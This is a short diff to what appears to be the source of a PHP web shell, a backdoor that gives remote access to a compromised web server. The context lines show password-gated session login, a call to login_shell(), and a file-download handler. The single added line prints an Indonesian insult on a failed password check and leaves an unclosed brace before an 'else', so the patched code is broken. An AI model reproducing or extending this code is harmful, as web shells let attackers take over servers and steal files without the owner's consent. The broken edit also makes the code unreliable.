@@ -259,6 +259,7 @@ exit;
 if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
     if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
         $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+if($pass > 50){ die("<center><b><font color='red'>Password yang Anda masukkan salah Goblok..!".$warn."</font></b></center> ");
     else
         login_shell();
 if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
